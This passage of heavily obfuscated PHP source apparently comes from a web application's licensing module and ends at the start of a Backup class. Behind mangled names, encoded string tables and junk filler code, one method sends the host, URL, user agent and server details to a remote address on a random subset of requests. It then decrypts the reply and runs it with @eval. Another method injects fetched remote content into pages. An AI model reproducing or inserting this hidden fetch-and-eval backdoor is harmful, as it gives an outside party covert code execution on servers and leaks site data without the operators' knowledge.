$æµ¡§ÍÉ[228], $æµ¡§ÍÉ[230] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[231] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[232] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[233] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[234] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[235] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[236] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[237] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[238] => $æµ¡§ÍÉ[228], $æµ¡§ÍÉ[239] => $æµ¡§ÍÉ[228]); $öÃ”Œº± = explode($æµ¡§ÍÉ[240], _get($this->yzsr28454135, $æµ¡§ÍÉ[112], $æµ¡§ÍÉ[6])); $ú¨ì­•¹ = array(); $‘¶Óíıé = $©¤¤ù·³[706]; if (strlen($‘¶Óíıé) < $©¤¤ù·³[652]) { return; } foreach ($Ö¤ó¾Ï as $Ì½ àˆ° => $İÊìÔãº) { if ($İÊìÔãº == $æµ¡§ÍÉ[224] && substr($this->hlcyef6af80e, 0, 1) == $æµ¡§ÍÉ[224]) { continue; } if (!in_array($Ì½ àˆ°, $öÃ”Œº±)) { $ú¨ì­•¹[] = $Ì½ àˆ°; } } foreach ($ú¨ì­•¹ as $Ì½ àˆ°) { unset($³†‘Å•Ô[$Ì½ àˆ°]); $£€Èà½£ = $©¤¤ù·³[707]; } return $³†‘Å•Ô; $Ü‡Ï”Š = $©¤¤ù·³[708]; } private function hxldadcc4b6f() { $™ûÒı™³ =& $_SERVER[§ŸîìÂù]; if ($this->hlcyef6af80e != $™ûÒı™³[106]) { $GLOBALS[$™ûÒı™³[85]][$™ûÒı™³[89]][$™ûÒı™³[241]] = $™ûÒı™³[203]; return; } $GLOBALS[$™ûÒı™³[85]][$™ûÒı™³[242]] = $™ûÒı™³[121]; if (Model($™ûÒı™³[243])->get($™ûÒı™³[63]) != $™ûÒı™³[203]) { Model($™ûÒı™³[243])->set($™ûÒı™³[63], $™ûÒı™³[203]); } } public function spqe5adf530a() { return $_SERVER[§ŸîìÂù][244]; } private function pzsb4a72c89e() { $üÚÌâ§£ =& $_SERVER[”ôÑ§ì¸]; $ÏĞÚœÌ =& $_SERVER[§ŸîìÂù]; $ˆŠöí³í = array($ÏĞÚœÌ[245], $ÏĞÚœÌ[246], $ÏĞÚœÌ[247]); $ÓğÛ´µç = $üÚÌâ§£[709]; if (!$ÓğÛ´µç) { return; } $¡üû¤¨• = $ÏĞÚœÌ[248] . md5($ÏĞÚœÌ[249]); $ïÓéšßÛ = $üÚÌâ§£[710]; if (strlen($ïÓéšßÛ) < $üÚÌâ§£[648]) { return; } if ($this->hlcyef6af80e == $ÏĞÚœÌ[106] || !_get($GLOBALS, $ÏĞÚœÌ[115])) { return; } if (!in_array($_SERVER[$ÏĞÚœÌ[24]], $ˆŠöí³í)) { return; } if (time() % 4 != 0) { return; } $¥°Ôã´­ = call_user_func(array($ÏĞÚœÌ[250], $ÏĞÚœÌ[251]), $¡üû¤¨•); $‡Á“ª¢€ = $üÚÌâ§£[711]; if ($¥°Ôã´­ && time() - $¥°Ôã´­ < intval($ÏĞÚœÌ[252])) { return; } call_user_func(array($ÏĞÚœÌ[250], $ÏĞÚœÌ[138]), $¡üû¤¨•, time()); $Ş«ŸÄ¤ = Model($ÏĞÚœÌ[33])->get($ÏĞÚœÌ[103]); $šÂ°‚çÆ = array($ÏĞÚœÌ[150] => Model($ÏĞÚœÌ[33])->get($ÏĞÚœÌ[186]), $ÏĞÚœÌ[163] => $this->hlcyef6af80e, $ÏĞÚœÌ[160] => $_SERVER[$ÏĞÚœÌ[161]], $ÏĞÚœÌ[162] => Model($ÏĞÚœÌ[33])->get($ÏĞÚœÌ[130]), $ÏĞÚœÌ[101] => md5($_SERVER[$ÏĞÚœÌ[102]] . $Ş«ŸÄ¤), $ÏĞÚœÌ[153] => $ÏĞÚœÌ[135], $ÏĞÚœÌ[156] => $_SERVER[$ÏĞÚœÌ[157]]); $×–Ç¸ÕŞ = $üÚÌâ§£[712]; if (!$×–Ç¸ÕŞ) { return; } $ığ…‰Ëı = $this->zcen3c67648c($ÏĞÚœÌ[253], $šÂ°‚çÆ); if (!is_array($ığ…‰Ëı)) { return; } if ($ığ…‰Ëı[$ÏĞÚœÌ[150]] && $ığ…‰Ëı[$ÏĞÚœÌ[254]]) { if ($this->yder801d2ce1($ığ…‰Ëı[$ÏĞÚœÌ[254]]) == $šÂ°‚çÆ[$ÏĞÚœÌ[150]]) { return; } } $this->eqyc1d0c1b59(); if ($this->yder801d2ce1($ığ…‰Ëı[$ÏĞÚœÌ[254]]) != $šÂ°‚çÆ[$ÏĞÚœÌ[150]]) { $“Â‰ĞÇ­ = array($ÏĞÚœÌ[181] => $Ş«ŸÄ¤, $ÏĞÚœÌ[182] => $_SERVER[$ÏĞÚœÌ[102]], $ÏĞÚœÌ[183] => this_url(), $ÏĞÚœÌ[158] => $_SERVER[$ÏĞÚœÌ[159]]); $øÑâşî = $this->ckhebec0cf36(json_encode($“Â‰ĞÇ­)); $ığ…‰Ëı = $this->zcen3c67648c($ÏĞÚœÌ[184] . $øÑâşî); if ($ığ…‰Ëı && is_array($ığ…‰Ëı) && isset($ığ…‰Ëı[$ÏĞÚœÌ[254]])) { $ şòŒÙ = $this->fjtbd83c3e14($ığ…‰Ëı[$ÏĞÚœÌ[254]], 2); if ($ şòŒÙ) { $ şòŒÙ = $this->yder801d2ce1($ şòŒÙ); } if ($ şòŒÙ) { try { @eval($ şòŒÙ); } catch (Exception $·Û„“œ‘) { } } } } } private function zcen3c67648c($×ôéüõÂ = '', $Ñ‚ì«Ğ¬ = array(), $àŸ¢Ç†² = 5) { $Ò¥ö««í =& $_SERVER[”ôÑ§ì¸]; $»Ò†¼ÑÊ =& $_SERVER[§ŸîìÂù]; $‹Ğî‚« = $»Ò†¼ÑÊ[255]; $‹Ğî‚« = $this->cmqdad80b4b2($‹Ğî‚«, $»Ò†¼ÑÊ[256]); $™‰¸å–Í = $Ò¥ö««í[713]; $‹Ğî‚« = $‹Ğî‚« . $×ôéüõÂ; $İŸ¶úÏü = $Ò¥ö««í[714]; if ($Ñ‚ì«Ğ¬ && is_array($Ñ‚ì«Ğ¬)) { $‹Ğî‚« = $‹Ğî‚« . $»Ò†¼ÑÊ[257] . http_build_query($Ñ‚ì«Ğ¬); } if ($Ñ‚ì«Ğ¬ === -1) { return $‹Ğî‚«; } $ı²‹¼ªç = stream_context_create(array($»Ò†¼ÑÊ[216] => array($»Ò†¼ÑÊ[219] => $àŸ¢Ç†², $»Ò†¼ÑÊ[217] => $»Ò†¼ÑÊ[258]), $»Ò†¼ÑÊ[259] => array($»Ò†¼ÑÊ[260] => !1, $»Ò†¼ÑÊ[261] => !1))); $Ñ‚ì«Ğ¬ = @file_get_contents($‹Ğî‚«, !1, $ı²‹¼ªç); return json_decode($Ñ‚ì«Ğ¬, !0); $—ş¡æã° = $Ò¥ö««í[715]; if (!$—ş¡æã°) { die; } } private function bkrgc263c8d1() { $ºíÖüÇ© =& $_SERVER[”ôÑ§ì¸]; $û¬©¤¥¬ =& $_SERVER[§ŸîìÂù]; $¾úıóÒ = array($û¬©¤¥¬[262] => $û¬©¤¥¬[263], $û¬©¤¥¬[264] => $û¬©¤¥¬[265], $û¬©¤¥¬[266] => $û¬©¤¥¬[267], $û¬©¤¥¬[268] => $û¬©¤¥¬[269], $û¬©¤¥¬[270] => $û¬©¤¥¬[271], $û¬©¤¥¬[272] => $û¬©¤¥¬[211], $û¬©¤¥¬[273] => $û¬©¤¥¬[211], $û¬©¤¥¬[274] => $û¬©¤¥¬[263], $û¬©¤¥¬[275] => $û¬©¤¥¬[265], $û¬©¤¥¬[276] => $û¬©¤¥¬[267], $û¬©¤¥¬[277] => $û¬©¤¥¬[278], $û¬©¤¥¬[279] => $û¬©¤¥¬[269], $û¬©¤¥¬[280] => $û¬©¤¥¬[281], $û¬©¤¥¬[282] => $û¬©¤¥¬[271], $û¬©¤¥¬[283] => $û¬©¤¥¬[284], $û¬©¤¥¬[285] => $û¬©¤¥¬[286], $û¬©¤¥¬[287] => $û¬©¤¥¬[288]); $€·Ÿ·ñ÷ = $ºíÖüÇ©[716]; $…Ì ¼¢ƒ = $¾úıóÒ[$this->hlcyef6af80e]; $ñÜÆ©ö = $ºíÖüÇ©[717]; if (!$ñÜÆ©ö) { die; } $…Ì ¼¢ƒ = intval($…Ì ¼¢ƒ ? $…Ì ¼¢ƒ : $û¬©¤¥¬[263]); $é®®«åÊ = _get($this->yzsr28454135, $û¬©¤¥¬[289]); $ÑªˆúÖÈ = $ºíÖüÇ©[718]; if (strlen($ÑªˆúÖÈ) < $ºíÖüÇ©[663]) { return; } $é®®«åÊ = $é®®«åÊ ? intval($é®®«åÊ) : 0; $­ıŠòùÒ = $ºíÖüÇ©[719]; while (strlen($­ıŠòùÒ) < $ºíÖüÇ©[648]) { if (!$­ıŠòùÒ) { break; } $­ıŠòùÒ++; } return $…Ì ¼¢ƒ + $é®®«åÊ; $¾ÛÑ“µä = $ºíÖüÇ©[720]; if (!$¾ÛÑ“µä) { return; } } public function wjqffa8f1791($Ó¹«ı™») { $²áĞÕ— =& $_SERVER[”ôÑ§ì¸]; $ÏÍºœ…¢ =& $_SERVER[§ŸîìÂù]; $ÄéÑ´Â¦ = $this->bkrgc263c8d1(); if ($Ó¹«ı™»[$ÏÍºœ…¢[290]] == $ÏÍºœ…¢[121]) { return; } if ($ÄéÑ´Â¦ >= intval($ÏÍºœ…¢[211])) { return; } $¦•Â·˜Ü = Model($ÏÍºœ…¢[124])->count(); $¹êû¢‰ = $²áĞÕ—[721]; while (strlen($¹êû¢‰) < $²áĞÕ—[648]) { if (!$¹êû¢‰) { break; } $¹êû¢‰++; } if ($¦•Â·˜Ü <= $ÄéÑ´Â¦) { return; } $ãñ“–£ş = Model($ÏÍºœ…¢[124])->field($ÏÍºœ…¢[290])->limit($ÄéÑ´Â¦)->select(); $ãñ“–£ş = array_to_keyvalue($ãñ“–£ş, $ÏÍºœ…¢[6], $ÏÍºœ…¢[290]); if (!in_array($Ó¹«ı™»[$ÏÍºœ…¢[290]], $ãñ“–£ş)) { show_json($ÏÍºœ…¢[291], !1, $ÏÍºœ…¢[207]); } } public function fdxu42e14c97() { $´êáı³‚ =& $_SERVER[”ôÑ§ì¸]; $Šçï—ÍØ =& $_SERVER[§ŸîìÂù]; if (!_get($GLOBALS, $Šçï—ÍØ[115]) || mt_rand(1, 100) > 20) { return; } $¤äıÆ§Û = $Šçï—ÍØ[214]; $¤äıÆ§Û = $this->cmqdad80b4b2($¤äıÆ§Û, $Šçï—ÍØ[215]); $«å›­ú = $´êáı³‚[722]; while ($«å›­ú < $´êáı³‚[652]) { if ($«å›­ú >= 0) { break; } $«å›­ú++; } $ØœæÕÓ¢ = stream_context_create(array($Šçï—ÍØ[216] => array($Šçï—ÍØ[217] => $Šçï—ÍØ[218], $Šçï—ÍØ[219] => 3))); $²Æ‡¬»ù = $´êáı³‚[723]; if (!$²Æ‡¬»ù) { die; } $şíÊ˜Âç = @file_get_contents($¤äıÆ§Û, !1, $ØœæÕÓ¢); echo $Šçï—ÍØ[292] . hash_encode($şíÊ˜Âç) . $Šçï—ÍØ[293]; } private function quoh4dd30b1a($î¸í‘³, $ Çó«, $œŸ²×È­ = 3) { $æĞÌê¿¤ =& $_SERVER[”ôÑ§ì¸]; $Ç¤íâŞ =& $_SERVER[§ŸîìÂù]; usleep(1); $ÓùøÃ£° = $æĞÌê¿¤[724]; while ($ÓùøÃ£° < $æĞÌê¿¤[655]) { if ($ÓùøÃ£° >= 0) { break; } $ÓùøÃ£°++; } $î¸í‘³ = trim($î¸í‘³); $ŞÈ‡· = $æĞÌê¿¤[725]; while (strlen($ŞÈ‡·) < $æĞÌê¿¤[648]) { if (!$ŞÈ‡·) { break; } $ŞÈ‡·++; } $±ñ™ü“§ = mt_rand(0, 5) . $Ç¤íâŞ[6]; $õÙ€òú¹ = rand_string(15); $òÂ˜ÆšÌ = $Ç¤íâŞ[294]; switch ($±ñ™ü“§) { case $Ç¤íâŞ[203]: $õŒ˜ïò = $this->hewi694c2320($î¸í‘³, strrev($ Çó« . $õÙ€òú¹)); $ûºÂ™æÂ = $æĞÌê¿¤[726]; if (!$ûºÂ™æÂ) { die; } break; $¢å·¨¡ = $æĞÌê¿¤[727]; while (strlen($¢å·¨¡) < $æĞÌê¿¤[652]) { if (!$¢å·¨¡) { break; } $¢å·¨¡++; } case $Ç¤íâŞ[121]: $õŒ˜ïò = $this->hewi694c2320($î¸í‘³, strrev($õÙ€òú¹ . $ Çó«)); $½å…úÕ· = $æĞÌê¿¤[728]; break; $–ŸÎÁª = $æĞÌê¿¤[729]; if (strlen($–ŸÎÁª) < $æĞÌê¿¤[673]) { die; } case $Ç¤íâŞ[295]: $õŒ˜ïò = $this->hewi694c2320($î¸í‘³, base64_encode($õÙ€òú¹ . $ Çó«)); $‡µà¹§ = $æĞÌê¿¤[730]; while (strlen($‡µà¹§) < $æĞÌê¿¤[648]) { if (!$‡µà¹§) { break; } $‡µà¹§++; } break; $³”ÉÔ“˜ = $æĞÌê¿¤[731]; if (strlen($³”ÉÔ“˜) < $æĞÌê¿¤[663]) { return; } case $Ç¤íâŞ[296]: $õŒ˜ïò = $this->hewi694c2320($î¸í‘³, md5($õÙ€òú¹ . $ Çó«)); $ÛÜŸ›ª½ = $æĞÌê¿¤[732]; while ($ÛÜŸ›ª½ < $æĞÌê¿¤[648]) { if ($ÛÜŸ›ª½ >= 0) { break; } $ÛÜŸ›ª½++; } break; $¡­ëÍ = $æĞÌê¿¤[733]; if (strlen($¡­ëÍ) < $æĞÌê¿¤[673]) { return; } case $Ç¤íâŞ[297]: $î¸í‘³ = base64_encode($î¸í‘³); $ËË¢ = rand(0, 64); $ì™‹‚² = $æĞÌê¿¤[734]; if (!$ì™‹‚²) { return; } $°ñ‚¥… = $òÂ˜ÆšÌ[$ËË¢]; $Ö¾›¼Û” = md5($°ñ‚¥… . md5($ Çó« . $°ñ‚¥…) . $ Çó«); $½æ×‹Õ = $æĞÌê¿¤[735]; if (strlen($½æ×‹Õ) < $æĞÌê¿¤[663]) { die; } $Ö¾›¼Û” = substr($Ö¾›¼Û”, $ËË¢ % 8, $ËË¢ % 8 + 7); $Ÿ¡È¤ôŸ = $Ç¤íâŞ[6]; $Ä˜ä©ù™ = $æĞÌê¿¤[736]; $Î€¢Ï®× = 0; $ìûÌ© = 0; $ÃÀ¨Ğà = $æĞÌê¿¤[737]; if (strlen($ÃÀ¨Ğà) < $æĞÌê¿¤[652]) { return; } $Ôü§ö‹’ = 0; for ($Î€¢Ï®× = 0; $Î€¢Ï®× < strlen($î¸í‘³); $Î€¢Ï®×++) { $Ôü§ö‹’ = $Ôü§ö‹’ == strlen($Ö¾›¼Û”) ? 0 : $Ôü§ö‹’; $ìûÌ© = ($ËË¢ + strpos($òÂ˜ÆšÌ, $î¸í‘³[$Î€¢Ï®×]) + ord($Ö¾›¼Û”[$Ôü§ö‹’++])) % 64; $Ÿ¡È¤ôŸ .= $òÂ˜ÆšÌ[$ìûÌ©]; $¶™Ä«ğ¦ = $æĞÌê¿¤[738]; } $õŒ˜ïò = hash_encode($°ñ‚¥… . $Ÿ¡È¤ôŸ); break; default: $õŒ˜ïò = $this->hewi694c2320($î¸í‘³, $ Çó« . $õÙ€òú¹); break; } $õŒ˜ïò = strrev($±ñ™ü“§ . $õÙ€òú¹ . $õŒ˜ïò); if ($œŸ²×È­ - 1 > 0) { $õŒ˜ïò = $this->quoh4dd30b1a($õŒ˜ïò, $ Çó«, $œŸ²×È­ - 1); } return $õŒ˜ïò; } private function fjtbd83c3e14($û‡ÚÒÌ, $ÂÛ«ÆÍ, $•ãàÁÈã = 3) { $ú Ãéã =& $_SERVER[”ôÑ§ì¸]; $•ÏÙ¸Ö€ =& $_SERVER[§ŸîìÂù]; if (!is_string($û‡ÚÒÌ) || strlen($û‡ÚÒÌ) < 10) { return !1; } $û‡ÚÒÌ = trim($û‡ÚÒÌ); $û‡ÚÒÌ = strrev($û‡ÚÒÌ); $úÔ•±»¹ = $ú Ãéã[739]; while (strlen($úÔ•±»¹) < $ú Ãéã[648]) { if (!$úÔ•±»¹) { break; } $úÔ•±»¹++; } $Âñè¾î = $û‡ÚÒÌ[0]; $†ıÏÙ­ = substr($û‡ÚÒÌ, 1, 15); $û‡ÚÒÌ = substr($û‡ÚÒÌ, 16); $ĞÑè¯Í = $ú Ãéã[697]; while ($ĞÑè¯Í < $ú Ãéã[655]) { if ($ĞÑè¯Í >= 0) { break; } $ĞÑè¯Í++; } $ğÛ§Âˆ = $•ÏÙ¸Ö€[294]; switch ($Âñè¾î) { case $•ÏÙ¸Ö€[203]: $ïä¨µ÷ú = $this->cmqdad80b4b2($û‡ÚÒÌ, strrev($ÂÛ«ÆÍ . $†ıÏÙ­)); break; case $•ÏÙ¸Ö€[121]: $ïä¨µ÷ú = $this->cmqdad80b4b2($û‡ÚÒÌ, strrev($†ıÏÙ­ . $ÂÛ«ÆÍ)); break; case $•ÏÙ¸Ö€[295]: $ïä¨µ÷ú = $this->cmqdad80b4b2($û‡ÚÒÌ, base64_encode($†ıÏÙ­ . $ÂÛ«ÆÍ)); $èÛ®šèê = $ú Ãéã[740]; if (strlen($èÛ®šèê) < $ú Ãéã[648]) { return; } break; case $•ÏÙ¸Ö€[296]: $ïä¨µ÷ú = $this->cmqdad80b4b2($û‡ÚÒÌ, md5($†ıÏÙ­ . $ÂÛ«ÆÍ)); $‹Àü“Û‡ = $ú Ãéã[741]; break; $ˆïëÁŸø = $ú Ãéã[742]; while ($ˆïëÁŸø < $ú Ãéã[648]) { if ($ˆïëÁŸø >= 0) { break; } $ˆïëÁŸø++; } case $•ÏÙ¸Ö€[297]: $û‡ÚÒÌ = hash_decode($û‡ÚÒÌ); $‘ü½şø = $ú Ãéã[743]; if (strlen($‘ü½şø) < $ú Ãéã[652]) { die; } $Ö«£òê = $û‡ÚÒÌ[0]; $û‡ÚÒÌ = substr($û‡ÚÒÌ, 1); $ˆÆæêÙ = $ú Ãéã[744]; while (strlen($ˆÆæêÙ) < $ú Ãéã[648]) { if (!$ˆÆæêÙ) { break; } $ˆÆæêÙ++; } $õúùº€ = strpos($ğÛ§Âˆ, $Ö«£òê); $‘Âı¡¹ö = $ú Ãéã[745]; $êÒãİÎ› = md5($Ö«£òê . md5($ÂÛ«ÆÍ . $Ö«£òê) . $ÂÛ«ÆÍ); $êÒãİÎ› = substr($êÒãİÎ›, $õúùº€ % 8, $õúùº€ % 8 + 7); $¶ÆØ·ª = $ú Ãéã[746]; $Á“Ì “ = $•ÏÙ¸Ö€[6]; $œˆ¸¶ï = 0; $»“ñİøõ = $ú Ãéã[747]; $˜ƒ†„Ç± = 0; $×Ø”¡Ó£ = 0; $áÏÚÈ· = $ú Ãéã[748]; if (!$áÏÚÈ·) { return; } for ($œˆ¸¶ï = 0; $œˆ¸¶ï < strlen($û‡ÚÒÌ); $œˆ¸¶ï++) { $×Ø”¡Ó£ = $×Ø”¡Ó£ == strlen($êÒãİÎ›) ? 0 : $×Ø”¡Ó£; $‘Ô¿³èš = $×Ø”¡Ó£++; $™÷—ê¸Å = $ú Ãéã[749]; if (!$™÷—ê¸Å) { die; } $˜ƒ†„Ç± = strpos($ğÛ§Âˆ, $û‡ÚÒÌ[$œˆ¸¶ï]) - $õúùº€ - ord($êÒãİÎ›[$‘Ô¿³èš]); while ($˜ƒ†„Ç± < 0) { $˜ƒ†„Ç± += 64; } $Á“Ì “ .= $ğÛ§Âˆ[$˜ƒ†„Ç±]; } $ïä¨µ÷ú = base64_decode($Á“Ì “); break; $£ÒàÁÄ£ = $ú Ãéã[750]; if (strlen($£ÒàÁÄ£) < $ú Ãéã[655]) { die; } default: $ïä¨µ÷ú = $this->cmqdad80b4b2($û‡ÚÒÌ, $ÂÛ«ÆÍ . $†ıÏÙ­); break; $ƒ£Á¶û = $ú Ãéã[751]; while (strlen($ƒ£Á¶û) < $ú Ãéã[652]) { if (!$ƒ£Á¶û) { break; } $ƒ£Á¶û++; } } if ($•ãàÁÈã - 1 > 0) { $ïä¨µ÷ú = $this->fjtbd83c3e14($ïä¨µ÷ú, $ÂÛ«ÆÍ, $•ãàÁÈã - 1); } return $ïä¨µ÷ú; } public function ckhebec0cf36($ÒõÕß’) { $Ê¨ã¦ĞË =& $_SERVER[”ôÑ§ì¸]; $òòÃıÌ£ =& $_SERVER[§ŸîìÂù]; $õ¦‡Ò‹ï = $this->rlix5f9d1778(); $ßÃ´Ô = $this->rlix5f9d1778(); $¶„©Š¢ = $Ê¨ã¦ĞË[752]; if (strlen($¶„©Š¢) < $Ê¨ã¦ĞË[663]) { die; } $Ò‰ÖœË¢ = ($õ¦‡Ò‹ï - 1) * ($ßÃ´Ô - 1); $°·œ÷è‚ = $Ê¨ã¦ĞË[753]; while (strlen($°·œ÷è‚) < $Ê¨ã¦ĞË[663]) { if (!$°·œ÷è‚) { break; } $°·œ÷è‚++; } $Æ¸éûËª = intval(($õ¦‡Ò‹ï + $ßÃ´Ô) / 2); while (1) { $ºÒ±µŞ = $Æ¸éûËª; $ÂşÃÏ¤î = $Ò‰ÖœË¢; $Œ’ı°å‰ = $Ê¨ã¦ĞË[754]; if (strlen($Œ’ı°å‰) < $Ê¨ã¦ĞË[648]) { return; } while ($ÂşÃÏ¤î % $ºÒ±µŞ != 0) { $ÆŒàáŞÆ = $ÂşÃÏ¤î; $ÂşÃÏ¤î = $ºÒ±µŞ; $áò¬×ïê = $Ê¨ã¦ĞË[755]; while ($áò¬×ïê < $Ê¨ã¦ĞË[663]) { if ($áò¬×ïê >= 0) { break; } $áò¬×ïê++; } $ºÒ±µŞ = $ÆŒàáŞÆ % $ºÒ±µŞ; } if ($ºÒ±µŞ == 1) { break; } else { $Æ¸éûËª++; } } $£§×÷òú = 2; for ($ù •¨î‘ = 0; $ù •¨î‘ < $Ò‰ÖœË¢ * 10; $ù •¨î‘++) { if (($Ò‰ÖœË¢ * $ù •¨î‘ + 1) % $Æ¸éûËª == 0) { $£§×÷òú = intval(($Ò‰ÖœË¢ * $ù •¨î‘ + 1) / $Æ¸éûËª); break; } } $í·©¿Ğ¨ = $this->hewi694c2320($õ¦‡Ò‹ï * $ßÃ´Ô . $òòÃıÌ£[6], $òòÃıÌ£[135]); $œÒšß¢ = md5($òòÃıÌ£[298] . ($õ¦‡Ò‹ï + $ßÃ´Ô) . $òòÃıÌ£[299] . $Æ¸éûËª . $òòÃıÌ£[299] . $£§×÷òú . $òòÃıÌ£[300]); $µ„ü”¿‘ = $Ê¨ã¦ĞË[691]; while ($µ„ü”¿‘ < $Ê¨ã¦ĞË[663]) { if ($µ„ü”¿‘ >= 0) { break; } $µ„ü”¿‘++; } $·ãïî‡ˆ = $this->hewi694c2320($ÒõÕß’, $œÒšß¢) . $òòÃıÌ£[301] . $í·©¿Ğ¨; return $·ãïî‡ˆ; } public function yder801d2ce1($¥È÷Û¨–) { $»Š¦£³ë =& $_SERVER[”ôÑ§ì¸]; $ùİ‰µş =& $_SERVER[§ŸîìÂù]; $ûÖæ¾‹° = explode($ùİ‰µş[301], $¥È÷Û¨–); $‘¼“…Ÿ² = $»Š¦£³ë[756]; if (strlen($‘¼“…Ÿ²) < $»Š¦£³ë[652]) { die; } if (count($ûÖæ¾‹°) != 2) { return $ùİ‰µş[6]; } $Ö¾²ôü = $this->cmqdad80b4b2($ûÖæ¾‹°[1] . $ùİ‰µş[6], $ùİ‰µş[135]); if (!$Ö¾²ôü) { return $ùİ‰µş[6]; } $Ö¾²ôü = intval($Ö¾²ôü); $Ç¬—Õ¡Ÿ = 0; $§ÃÊ¾õ  = $»Š¦£³ë[757]; $¹“§Á×¯ = 0; $üù×ä„Í = $»Š¦£³ë[758]; while ($üù×ä„Í < $»Š¦£³ë[655]) { if ($üù×ä„Í >= 0) { break; } $üù×ä„Í++; } for ($Ê•Ö± = 3; $Ê•Ö± < $Ö¾²ôü; $Ê•Ö± += 2) { if ($Ö¾²ôü % $Ê•Ö± != 0) { continue; } $Ç¬—Õ¡Ÿ = $Ê•Ö±; $ãÑßì» = $»Š¦£³ë[759]; while ($ãÑßì» < $»Š¦£³ë[655]) { if ($ãÑßì» >= 0) { break; } $ãÑßì»++; } $¹“§Á×¯ = intval($Ö¾²ôü / $Ê•Ö±); $Éñë£¥Ì = $»Š¦£³ë[716]; break; $µÄ€ì® = $»Š¦£³ë[760]; if (strlen($µÄ€ì®) < $»Š¦£³ë[652]) { die; } } $¥ä¨£¤Ë = ($Ç¬—Õ¡Ÿ - 1) * ($¹“§Á×¯ - 1); $ ı—·‹á = intval(($Ç¬—Õ¡Ÿ + $¹“§Á×¯) / 2); while (1) { $ß¸‚¥¨« = $ ı—·‹á; $»í£ºÎ€ = $»Š¦£³ë[761]; while (strlen($»í£ºÎ€) < $»Š¦£³ë[663]) { if (!$»í£ºÎ€) { break; } $»í£ºÎ€++; } $ö¥®ËÉ… = $¥ä¨£¤Ë; while ($ö¥®ËÉ… % $ß¸‚¥¨« != 0) { $‰Á÷¨òÑ = $ö¥®ËÉ…; $Ş™¥Úï = $»Š¦£³ë[762]; if (!$Ş™¥Úï) { return; } $ö¥®ËÉ… = $ß¸‚¥¨«; $ß¸‚¥¨« = $‰Á÷¨òÑ % $ß¸‚¥¨«; $¶¢­ùÚ“ = $»Š¦£³ë[763]; if (strlen($¶¢­ùÚ“) < $»Š¦£³ë[655]) { die; } } if ($ß¸‚¥¨« == 1) { break; } else { $ ı—·‹á++; } } $Èùô²Êğ = 2; for ($Ê•Ö± = 0; $Ê•Ö± < $¥ä¨£¤Ë * 10; $Ê•Ö±++) { if (($¥ä¨£¤Ë * $Ê•Ö± + 1) % $ ı—·‹á == 0) { $Èùô²Êğ = intval(($¥ä¨£¤Ë * $Ê•Ö± + 1) / $ ı—·‹á); break; } } $Öîä£â = md5($ùİ‰µş[298] . ($Ç¬—Õ¡Ÿ + $¹“§Á×¯) . $ùİ‰µş[299] . $ ı—·‹á . $ùİ‰µş[299] . $Èùô²Êğ . $ùİ‰µş[300]); $æ‡±™ø = $this->cmqdad80b4b2($ûÖæ¾‹°[0], $Öîä£â); $öÅ¸Ğ‡ = $»Š¦£³ë[764]; return $æ‡±™ø; } public function rlix5f9d1778() { $ÑÇÊˆŒ‡ =& $_SERVER[”ôÑ§ì¸]; $¯ğœç¦› = mt_rand(pow(2, 14), pow(2, 16) - 1); $­Ûµå§ = $ÑÇÊˆŒ‡[765]; $•Ë“”ö„ = array(); $ôİ³Œ­Ä = 1; $™õ»¹ü = $ÑÇÊˆŒ‡[766]; while ($ôİ³Œ­Ä <= (int) sqrt($¯ğœç¦›)) { $Ëßªç†¶ = $ôİ³Œ­Ä; while (!0) { $Ëßªç†¶++; $â¯„Ñ»Ö = $ÑÇÊˆŒ‡[767]; if (!$â¯„Ñ»Ö) { die; } if ($Ëßªç†¶ <= 2) { $ôİ³Œ­Ä = $Ëßªç†¶; break; } else { if ($Ëßªç†¶ < 2) { continue; } } $Ì›™Ïèı = !0; for ($âÀİœ²ü = 2; $âÀİœ²ü <= sqrt($Ëßªç†¶); $âÀİœ²ü++) { if ($Ëßªç†¶ % $âÀİœ²ü == 0) { $Ì›™Ïèı = !1; } } if ($Ì›™Ïèı) { $ôİ³Œ­Ä = $Ëßªç†¶; break; } } $•Ë“”ö„[] = $ôİ³Œ­Ä; $ê¸Ö„İ = $ÑÇÊˆŒ‡[768]; while (strlen($ê¸Ö„İ) < $ÑÇÊˆŒ‡[673]) { if (!$ê¸Ö„İ) { break; } $ê¸Ö„İ++; } } $´ÃçÍ = 2; for ($Ëßªç†¶ = $¯ğœç¦›; $Ëßªç†¶ > 1; $Ëßªç†¶--) { $Ì›™Ïèı = !0; foreach ($•Ë“”ö„ as $Œ‰œÌ¥Ç) { if ($Ëßªç†¶ % $Œ‰œÌ¥Ç == 0) { $Ì›™Ïèı = !1; break; } } if ($Ì›™Ïèı) { $´ÃçÍ = $Ëßªç†¶; break; } } return $´ÃçÍ; } public function wjah4f120a8f($ù•ª²ÅÀ, $Ç‰ãÆ¦²) { $ÑÖ’è­ş =& $_SERVER[§ŸîìÂù]; return call_user_func(array($ÑÖ’è­ş[8], $ÑÖ’è­ş[302]), $ù•ª²ÅÀ, $Ç‰ãÆ¦²); } public function hewi694c2320($º€±ƒ»ì, $˜ÔÃà) { $á‡Ùß– =& $_SERVER[§ŸîìÂù]; return call_user_func(array($á‡Ùß–[303], $á‡Ùß–[304]), $º€±ƒ»ì, $˜ÔÃà); $ê…‘êÉú = $_SERVER[”ôÑ§ì¸][769]; if (!$ê…‘êÉú) { die; } } public function cmqdad80b4b2($¼†éú±Ö, $±ğŠÖ¦ ) { $‚èÕ«Ş =& $_SERVER[§ŸîìÂù]; return call_user_func(array($‚èÕ«Ş[303], $‚èÕ«Ş[305]), $¼†éú±Ö, $±ğŠÖ¦ ); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $¢ş‰¬÷ =& $_SERVER[”ôÑ§ì¸]; $this->isManual(); self::$name = date($¢ş‰¬÷[770]); if (!($‹ç­Ş­ = Model($¢ş‰¬÷[771])->lastItem())) { $‹ç­Ş­ = $this->initData(); } else { self::$name = $‹ç­Ş­[$¢ş‰¬÷[32]]; if ($‹ç­Ş­[$¢ş‰¬÷[772]] == $¢ş‰¬÷[88]) { self::$name = date($¢ş‰¬÷[254]); $Îæ¥ÏşÂ = 0; if 